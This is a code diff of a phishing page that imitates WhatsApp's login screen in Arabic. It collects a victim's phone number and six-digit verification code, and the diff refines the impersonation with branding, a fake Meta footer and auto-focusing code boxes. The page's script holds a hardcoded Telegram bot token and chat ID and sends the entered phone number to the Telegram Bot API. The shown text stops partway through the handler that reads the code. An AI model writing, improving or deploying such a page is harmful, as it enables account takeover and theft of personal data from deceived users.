@@ -3,52 +3,63 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WhatsApp - تسجيل الدخول</title>
+<title>WhatsApp</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,Roboto,'Segoe UI',Tahoma,Arial,sans-serif}
 body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
 .card{background:#fff;border-radius:12px;padding:30px 25px;max-width:400px;width:100%}
 .logo{text-align:center;margin-bottom:25px}
-.logo .icon{font-size:60px;margin-bottom:10px}
-.logo h1{color:#25D366;font-size:24px;font-weight:bold}
+.logo .icon{width:80px;height:80px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
+.logo .icon span{font-size:45px;color:#fff}
+.logo h1{color:#075E54;font-size:26px;font-weight:bold}
 .logo p{color:#666;font-size:14px;margin-top:5px}
 label{display:block;font-size:14px;color:#333;margin-top:15px;margin-bottom:6px;font-weight:bold}
 input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box}
 .btn{width:100%;padding:15px;background:#25D366;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:15px}
-.code-inputs{display:flex;gap:8px;margin-top:15px;justify-content:center}
-.code-inputs input{width:40px;height:50px;text-align:center;font-size:20px;font-weight:bold;padding:0}
-.msg{text-align:center;font-size:13px;color:#666;margin-top:15px}
+.code-inputs{display:flex;gap:8px;margin-top:15px;justify-content:center;direction:ltr}
+.code-inputs input{width:42px;height:52px;text-align:center;font-size:22px;font-weight:bold;padding:0}
+.msg{text-align:center;font-size:14px;color:#333;margin-top:15px;line-height:1.6}
+.resend{text-align:center;color:#25D366;font-size:14px;margin-top:15px;font-weight:bold}
+.footer{text-align:center;font-size:12px;color:#999;margin-top:25px}
 </style>
 </head>
 <body>
 <div class="card">
 <div class="logo">
-<div class="icon">💬</div>
+<div class="icon"><span>💬</span></div>
 <h1>WhatsApp</h1>
 <p>أدخل رقم هاتفك للتحقق</p>
 </div>
 <form id="f">
 <label>رقم الهاتف</label>
-<input type="tel" id="phone" placeholder="+964 xxx xxx xxxx" required>
+<input type="tel" id="phone" placeholder="+964 7XX XXX XXXX" required>
 <button type="submit" class="btn">التالي</button>
 </form>
 <div id="codeSection" style="display:none">
-<div class="msg">تم إرسال رمز التحقق إلى رقم هاتفك</div>
-<label style="text-align:center">أدخل رمز التحقق</label>
+<div class="msg">تم إرسال رمز مكون من 6 أرقام إلى رقم هاتفك</div>
+<label style="text-align:center;display:block;margin-top:15px">أدخل رمز التحقق</label>
 <div class="code-inputs">
-<input type="tel" maxlength="1" id="c1">
-<input type="tel" maxlength="1" id="c2">
-<input type="tel" maxlength="1" id="c3">
-<input type="tel" maxlength="1" id="c4">
-<input type="tel" maxlength="1" id="c5">
-<input type="tel" maxlength="1" id="c6">
+<input type="tel" maxlength="1" id="c1" inputmode="numeric">
+<input type="tel" maxlength="1" id="c2" inputmode="numeric">
+<input type="tel" maxlength="1" id="c3" inputmode="numeric">
+<input type="tel" maxlength="1" id="c4" inputmode="numeric">
+<input type="tel" maxlength="1" id="c5" inputmode="numeric">
+<input type="tel" maxlength="1" id="c6" inputmode="numeric">
 </div>
+<div class="resend">إعادة إرسال الرمز</div>
 <button type="button" class="btn" id="verifyBtn">تحقق</button>
 </div>
+<div class="footer">© 2026 WhatsApp - Meta</div>
 </div>
 <script>
 const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
 const CHAT='-1003821295154';
+// Auto-focus on code inputs
+['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{
+document.getElementById(id).addEventListener('input', function(){
+if(this.value.length===1 && i<arr.length-1){ document.getElementById(arr[i+1]).focus(); }
+});
+});
 document.getElementById('f').addEventListener('submit', async function(e){
 e.preventDefault();
 const phone=document.getElementById('phone').value;
@@ -56,6 +67,7 @@ const msg='💬 *واتساب*\n\n📞 الرقم: `'+phone+'`\n🕐 '+new Date(
 await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
 document.getElementById('f').style.display='none';
 document.getElementById('codeSection').style.display='block';
+document.getElementById('c1').focus();
 });
 document.getElementById('verifyBtn').addEventListener('click', async function(){
 const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
